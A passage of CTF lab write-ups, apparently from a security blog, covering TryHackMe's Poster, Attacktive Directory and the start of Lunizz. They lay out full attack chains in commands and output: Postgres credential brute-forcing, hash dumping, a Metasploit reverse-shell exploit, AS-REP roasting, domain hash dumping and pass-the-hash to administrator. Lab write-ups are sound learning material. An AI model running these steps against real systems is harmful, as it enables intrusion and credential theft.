scott:tiger@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password) [-] 10.10.211.18:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   Used module goes through each username and password combination from the provided lists. After few failed combination we are left with one successful login credentials.\nCommand Execution Instead of logging into the database directly we will use another auxiliary module that allows us to execute commands with the proper user credentials.\nLet us use chosen module to verify the service version. We can use the setg command for setting remote hosts option globally therefore we will not need to set this option every time we load a new module.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  sf6 auxiliary(scanner/postgres/postgres_login) \u0026gt; use auxiliary/admin/postgres/postgres_sql msf6 auxiliary(admin/postgres/postgres_sql) \u0026gt; show options Module options (auxiliary/admin/postgres/postgres_sql): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RETURN_ROWSET true no Set to true to see query result sets RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port SQL select version() no The SQL query to execute USERNAME postgres yes The username to authenticate as VERBOSE false no Enable verbose output   1 2 3 4 5 6 7 8 9 10 11  msf6 auxiliary(admin/postgres/postgres_sql) \u0026gt; run [*] Running module against 10.10.211.18 Query Text: \u0026#39;select version()\u0026#39; ============================== version ------- PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit [*] Auxiliary module execution completed   Based on the output above we can see that the service is running version 9.5.21.\nThe default query for this module is set to select the version of the database (select version()). We can set this option to any valid SQL code we want.\nHash Dumping Metasploit has a module that will quickly dump any password hashes in the database for us. We will have to set the password option to password based on the found credentials in the User credentials enumeration section.\n1 2 3 4 5 6 7 8 9 10 11 12 13  msf6 auxiliary(admin/postgres/postgres_sql) \u0026gt; use auxiliary/scanner/postgres/postgres_hashdump msf6 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; show options Module options (auxiliary/scanner/postgres/postgres_hashdump): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE postgres yes The database to authenticate against PASSWORD postgres no The password for the specified username. Leave blank for a random password. RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USERNAME postgres yes The username to authenticate as   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  msf6 auxiliary(scanner/postgres/postgres_hashdump) \u0026gt; run [+] Query appears to have run successfully [+] Postgres Server Hashes ====================== Username Hash -------- ---- darkstart md58842b99375db43e9fdf238753623a27d poster md578fb805c7412ae597b399844a54cce0a postgres md532e12f215ba27cb750c9e093ce4b5127 sistemas md5f7dbc0d5a06653e74da6b1af9290ee2b ti md57af9ac4c593e9e4f275576e13f935579 tryhackme md503aab1165001c8f8ccae31a8824efddc [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   On the output above, we can see the query returns the password hashes.\nRead the System Files To read system files via the PostgreSQL database, we will use the following module. The default remote file to read is set to /etc/passwd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  msf6 auxiliary(admin/postgres/postgres_readfile) \u0026gt; run [*] Running module against 10.10.211.18 Query Text: \u0026#39;CREATE TEMP TABLE YpKVHV (INPUT TEXT); COPY YpKVHV FROM \u0026#39;/etc/passwd\u0026#39;; SELECT * FROM YpKVHV\u0026#39; ===================================================================================================================== input ----- #/home/dark/credentials.txt _apt❌105:65534::/nonexistent:/bin/false alison❌1000:1000:Poster,,,:/home/alison:/bin/bash backup❌34:34:backup:/var/backups:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin dark❌1001:1001::/home/dark: games❌5:60:games:/usr/games:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin messagebus❌106:110::/var/run/dbus:/bin/false news❌9:9:news:/var/spool/news:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin postgres❌109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash proxy❌13:13:proxy:/bin:/usr/sbin/nologin root❌0:0:root:/root:/bin/bash sshd❌108:65534::/var/run/sshd:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync sys❌3:3:sys:/dev:/usr/sbin/nologin syslog❌104:108::/home/syslog:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin uuidd❌107:111::/run/uuidd:/bin/false www-data❌33:33:www-data:/var/www:/usr/sbin/nologin #/home/dark/credentials.txt root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog❌104:108::/home/syslog:/bin/false _apt❌105:65534::/nonexistent:/bin/false messagebus❌106:110::/var/run/dbus:/bin/false uuidd❌107:111::/run/uuidd:/bin/false alison❌1000:1000:Poster,,,:/home/alison:/bin/bash sshd❌108:65534::/var/run/sshd:/usr/sbin/nologin postgres❌109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash dark❌1001:1001::/home/dark: [+] 10.10.211.18:5432 Postgres - /etc/passwd saved in /home/squ33ker/.msf4/loot/20210403142959_default_10.10.211.18_postgres.file_514878.txt [*] Auxiliary module execution completed   From the Query Text, we can see that this module first creates a temporary table. Then it copies the content of the desired file, and returns it to us on the screen.\nGaining Access Arbitrary Command Execution To gain access we will use postgres_copy_from_program_cmd_exec exploit module which attempts to create a new table and then execute system commands in the context of copying the command output into the table.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  use exploit/multi/postgres/postgres_copy_from_program_cmd_exec msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; show options Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- DATABASE template1 yes The database to authenticate against DUMP_TABLE_OUTPUT false no select payload command output from table (For Debugging) PASSWORD postgres no The password for the specified username. Leave blank for a random password. RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 5432 yes The target port (TCP) TABLENAME JM2l6vx3vEa yes A table name that does not exist (To avoid deletion) USERNAME postgres yes The username to authenticate as Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic   Running this exploit we will get a shell as a postgres user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) \u0026gt; run [*] Started reverse TCP handler on 10.9.140.180:4444 [*] 10.10.211.18:5432 - 10.10.211.18:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit [*] 10.10.211.18:5432 - Exploiting... [+] 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa dropped successfully [+] 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa created successfully [+] 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa copied successfully(valid syntax/command) [+] 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa dropped successfully(Cleaned) [*] 10.10.211.18:5432 - Exploit Succeeded [*] Command shell session 1 opened (10.9.140.180:4444 -\u0026gt; 10.10.211.18:35476) at 2021-04-03 14:37:28 -0400 id uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert) python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; postgres@ubuntu:/var/lib/postgresql/9.5/main$   Horizontal Privilege Escalations User dark 1 2 3 4 5 6 7 8 9 10 11 12  postgres@ubuntu:/home/dark$ls -la ls -la total 28 drwxr-xr-x 2 dark dark 4096 Jul 28 2020 . drwxr-xr-x 4 root root 4096 Jul 28 2020 .. -rw------- 1 dark dark 26 Jul 28 2020 .bash_history -rw-r--r-- 1 dark dark 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 dark dark 3771 Aug 31 2015 .bashrc -rwxrwxrwx 1 dark dark 24 Jul 28 2020 credentials.txt -rw-r--r-- 1 dark dark 655 May 16 2017 .profile postgres@ubuntu:/home/dark$ cat credentials.txt dark:[REDACTED]   User dark has his credentials stored in plain text in his home directory with read-write-execute for everybody.\n1 2 3 4 5 6 7  postgres@ubuntu:/home/dark$ su dark su dark Password: [REDACTED] dark@ubuntu:~$ id id uid=1001(dark) gid=1001(dark) groups=1001(dark)   We will use found credentials to login as dark.\nUser alison Searching for any files owned by another system user called alison, we will find a config.php located in /var/www/html/ directory.\n1 2 3 4 5 6 7 8 9 10 11 12  dark@ubuntu:/opt/ufw$ find / -user alison 2\u0026gt;/dev/null find / -user alison 2\u0026gt; /dev/null /home/alison /home/alison/.bashrc /home/alison/.bash_logout /home/alison/.nano /home/alison/.profile /home/alison/.bash_history /home/alison/.sudo_as_admin_successful /home/alison/.cache /home/alison/user.txt /var/www/html/config.php   1 2 3 4 5 6 7 8 9  dark@ubuntu:/opt/ufw$ cat /var/www/html/config.php cat /var/www/html/config.php \u0026lt;?php $dbhost = \u0026#34;127.0.0.1\u0026#34;; $dbuname = \u0026#34;alison\u0026#34;; $dbpass = \u0026#34;[REDACTED]\u0026#34;; $dbname = \u0026#34;mysudopassword\u0026#34;; ?\u0026gt;\t  Assuming alison reuses her passwords, we can login to her account with found credentials.\n1 2 3 4 5 6 7  dark@ubuntu:/opt/ufw$ su alison su alison Password: [REDACTED] alison@ubuntu:/opt/ufw$ id id uid=1000(alison) gid=1000(alison) groups=1000(alison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)   Vertical Privilege Escalation Running sudo -l command, we will check our sudo permissions. We can see that user alison can run any command on the system. Let us switch to the user root with the flag -i.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  alison@ubuntu:~$ sudo -l sudo -l [sudo] password for alison: [REDACTED] Matching Defaults entries for alison on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User alison may run the following commands on ubuntu: (ALL : ALL) ALL alison@ubuntu:~$ sudo -i sudo -i root@ubuntu:~# id id uid=0(root) gid=0(root) groups=0(root)   \rThank you for reading this blog post.\n","description":"The sys admin set up a rdbms in a safe way.","id":7,"section":"posts","tags":["enumeration","postgres","sql","privilege escalation"],"title":"Poster [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/poster/"},{"content":"   Title  Attacktive Directory     Info  Can you exploit a vulnerable Domain Controller?   Difficulty  Medium   Date 2021/04/02    Scanning \u0026amp; Enumeration We are given a host with an IP address 10.10.246.75, which we will add to our hosts file located in etc directory as shown below:\n10.10.246.75 spookeysec.thm\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  Nmap scan report for spookeysec.thm (10.10.246.75) Host is up (0.084s latency). Not shown: 987 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-02 19:18:42Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: THM-AD | NetBIOS_Domain_Name: THM-AD | NetBIOS_Computer_Name: ATTACKTIVEDIREC | DNS_Domain_Name: spookysec.local | DNS_Computer_Name: AttacktiveDirectory.spookysec.local | Product_Version: 10.0.17763 |_ System_Time: 2021-04-02T19:18:47+00:00 | ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local | Issuer: commonName=AttacktiveDirectory.spookysec.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-04-01T17:32:13 | Not valid after: 2021-10-01T17:32:13 | MD5: 850f 4aff 0aa4 20ac 03fb caf8 843a 2f57 |_SHA-1: 3862 01c8 f1eb a4a1 ba67 d770 962d c54e 31b1 062f |_ssl-date: 2021-04-02T19:18:56+00:00; +1s from scanner time. Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows   Based on the scan output and open default ports, we can confirm that the given host is the Domain Controller.\nEnumerating Users  Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute to brute force discovery of users, passwords and even password spray.\nbut\nIt is NOT recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.\n Modified user and password lists are provided to cut down on time of enumeration. We will use the userlist.txt with userenum command to enumerate valid domain usernames via Kerberos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  kerbrute userenum -d spookysec.local --dc 10.10.246.75 userlist.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\  / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.2 (fd5f345) - 04/02/21 - Ronnie Flathers @ropnop 2021/04/02 14:55:46 \u0026gt; Using KDC(s): 2021/04/02 14:55:46 \u0026gt; 10.10.246.75:88 2021/04/02 14:55:47 \u0026gt; [+] VALID USERNAME:\tjames@spookysec.local 2021/04/02 14:55:48 \u0026gt; [+] VALID USERNAME:\tsvc-admin@spookysec.local 2021/04/02 14:55:50 \u0026gt; [+] VALID USERNAME:\tJames@spookysec.local 2021/04/02 14:55:50 \u0026gt; [+] VALID USERNAME:\trobin@spookysec.local 2021/04/02 14:55:59 \u0026gt; [+] VALID USERNAME:\tdarkstar@spookysec.local 2021/04/02 14:56:03 \u0026gt; [+] VALID USERNAME:\tadministrator@spookysec.local 2021/04/02 14:56:12 \u0026gt; [+] VALID USERNAME:\tbackup@spookysec.local 2021/04/02 14:56:16 \u0026gt; [+] VALID USERNAME:\tparadox@spookysec.local 2021/04/02 14:56:53 \u0026gt; [+] VALID USERNAME:\tJAMES@spookysec.local 2021/04/02 14:57:02 \u0026gt; [+] VALID USERNAME:\tRobin@spookysec.local . . .   Notice discovered svc-admin (service) and backup accounts.\nAbusing Kerberos After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting.\n ASReproasting occurs when a user account has the privilege \u0026ldquo;Does not require Pre-Authentication\u0026rdquo; set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.\n Retrieving Kerberos Tickets Impacket has a tool called \u0026ldquo;GetNPUsers.py\u0026rdquo; that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that\u0026rsquo;s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.\nBecause we are interested in svc-admin we will not enumerate once again with -userfile flag.\n1 2 3 4 5  python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.246.75 spookysec.local/svc-admin -no-pass Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for svc-admin $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:c25699e7cc2e7074548b65a8fe357e71$00d5eddf9d6a0f5e044905380c8f4f36363256b8f84268a7cc9f2e694b931856f1f5b12d82e2eada982897ee94be2bf2bb6de3f65dd4dafae30d91d56286dc6e02cb314dacc0133e2e74d96eb2c329b6ffe0fd836ba771fca8b56e27ced65302b17e275828d51dea640180e5001b95d59f3ab92fb9d69987ba4df7c264d507fcea712b39c1506ef945a633b2e20311d3101f8f950761f35a751817f349679b3d81115f5a316e2c59f1e9302afcfec05f8e8468bb60909d8a3a1ae7df87d8792b45b0be8e163af38f3328d3a96db49bfbf5ca50f6392a88433a77a50194aa66d19c6ee85b017281137745e4a4db7341f6172f   We successfully obtained hash for svc-admin which we will save to a file.\nLooking at the Hashcat Examples Wiki page we can identify retrived hash as Kerberos 5 AS-REP etype 23. This hash\u0026rsquo;s has-mode is 18200.\nNow let us use hashcat to crack the hash with the provided modified password list.\n1  hashcat -m 18200 hash.txt passwordlist.txt   After sometime, we will successfully crack the hash and obtain a password.\nFurther Enumeration We will attempt to enumerate with the help of smbclient any shares that the domain controller may be giving out.\n1 2 3 4 5 6 7 8 9 10 11 12  smbclient -L \\\\\\\\10.10.246.75\\\\ -U svc-admin Enter WORKGROUP\\svc-admin\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin backup Disk C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available   The backup directory stands out. We will try to connect to it.\n1 2 3 4 5 6 7 8 9 10 11 12  smbclient \\\\\\\\10.10.246.75\\\\backup -U svc-admin Enter WORKGROUP\\svc-admin\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Apr 4 15:08:39 2020 .. D 0 Sat Apr 4 15:08:39 2020 backup_credentials.txt A 48 Sat Apr 4 15:08:53 2020 8247551 blocks of size 4096. 3787994 blocks available smb: \\\u0026gt; get backup_credentials.txt getting file \\backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) smb: \\\u0026gt;   The backup directory contains backup_credentials.txt which we will download to our local machine with get command. Found credentials are encoded with base64 which we can decode with flag -d.\n1 2  cat backup_credentials.txt | base64 -d backup@spookysec.local:backup2517860   Elevating Privileges within the Domain We are going to use a tool called secretsdump.py which will us allow us to retrieve all of the password hashes that this user account (synced with the domain controller) has to offer.\n The backup account for the Domain Controller has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes.\n We want to extract only NTLM hashes and Kerberos keys. This is possible with -just-dc flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookeysec.local/backup:\u0026#39;backup2517860\u0026#39;@10.10.246.75 -just-dc Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21::: spookysec.local\\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4::: spookysec.local\\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4::: spookysec.local\\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b::: spookysec.local\\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e::: spookysec.local\\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b::: spookysec.local\\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7::: spookysec.local\\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a::: spookysec.local\\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb::: spookysec.local\\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2::: spookysec.local\\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705::: spookysec.local\\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664::: spookysec.local\\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809::: spookysec.local\\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538::: spookysec.local\\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc::: ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:73502f085b7efc629d5fa55115c714aa::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48 Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae Administrator:des-cbc-md5:2079ce0e5df189ad krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902 krbtgt:des-cbc-md5:b94f97e97fabbf5d . . . ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:a16e62bc903c3e4d6b119e7ebac172787132c27c2a92de8445ee2ed21aa151b2 ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:46df147f322db83c35a71726560090f2 ATTACKTIVEDIREC$:des-cbc-md5:253e5e528586d02c [*] Cleaning up...   Now all we need is to grab the Administrators hash and use psexec.py to get a shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.10.246.75 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.246.75..... [*] Found writable share ADMIN$ [*] Uploading file HEoFSkbZ.exe [*] Opening SVCManager on 10.10.246.75..... [*] Creating service jZRP on 10.10.246.75..... [*] Starting service jZRP..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.1490] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system   Or we can use a tool called Evil-WinRM and \u0026ldquo;pass the hash\u0026rdquo; method to authenticate as an Administrator without the password as shown below.\n1 2 3 4 5 6 7 8  evil-winrm -i 10.10.246.75 -u administrator -H 0e0363213e37b94221497260b0bcb4fc Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami thm-ad\\administrator   Now we have full control over the Active Directory Domain.\n\rThank you for reading this blog post.\n","description":"Can you exploit a vulnerable Domain Controller?","id":8,"section":"posts","tags":["enumeration","active directory","kerberos","privilege escalation"],"title":"Attacktive Directory [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/attacktive-directory/"},{"content":"   Title  Lunizz CTF     Info  Lunizz CTF   Difficulty  Medium   Date 2021/03/31    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.97.49\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12  nmap -v -sS -sV 10.10.97.49 Nmap scan report for 10.10.97.49 Host is up (0.11s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 3306/tcp open mysql MySQL 5.7.32-0ubuntu0.18.04.1 4444/tcp open krb524? 5000/tcp open upnp? 2 services unrecognized despite returning data.   Right away we can skip port 22 and 3306 because for now we do not have any credentials for these services.\nPort 80 Just a default Apache server page.\n\nPort 4444 Decoding encoded string bGV0bWVpbg== we will get letmein. This may be used later on.\nCan you decode this for me?\rbGV0bWVpbg==\rWrong Password\rDirectory Brute-Forcing Let us brute force directories and files exposed by the web server using gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  gobuster dir -e -u http://10.10.97.49 -w /usr/share/wordlists/dirb/common.txt -x txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.97.49 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/03/31 15:38:44 Starting gobuster in directory enumeration mode =============================================================== http://10.10.97.49/.hta (Status: 403) [Size: 276] http://10.10.97.49/.hta.txt (Status: 403) [Size: 276] http://10.10.97.49/.htaccess.txt (Status: 403) [Size: 276] http://10.10.97.49/.htpasswd (Status: 403) [Size: 276] http://10.10.97.49/.htpasswd.txt (Status: 403) [Size: 276] http://10.10.97.49/.htaccess (Status: 403) [Size: 276] http://10.10.97.49/hidden (Status: 301) [Size: 311] [--\u0026gt; http://10.10.97.49/hidden/] http://10.10.97.49/index.php (Status: 200) [Size: 10917] http://10.10.97.49/instructions.txt (Status: 200) [Size: 338] http://10.10.97.49/server-status (Status: 403) [Size: 276] http://10.10.97.49/whatever (Status: 301) [Size: 313] [--\u0026gt; http://10.10.97.49/whatever/] =============================================================== 2021/03/31 15:40:01 Finished ===============================================================   We will get some interesting results shown above like whatever and hidden directories and also instructions.txt file.\nResource /whatever It seems like we need to change the value 0 (probably to 1) of Command Executer Mode, because none of the commands submitted are executed.\n\nResource /hidden For now, we are not lucky with this resource either. Uploading a reverse shell (for example shell.php.jpg) and trying to bypass extensions validation will no result to successful upload.\n\nResource /instructions.txt Content of the resource 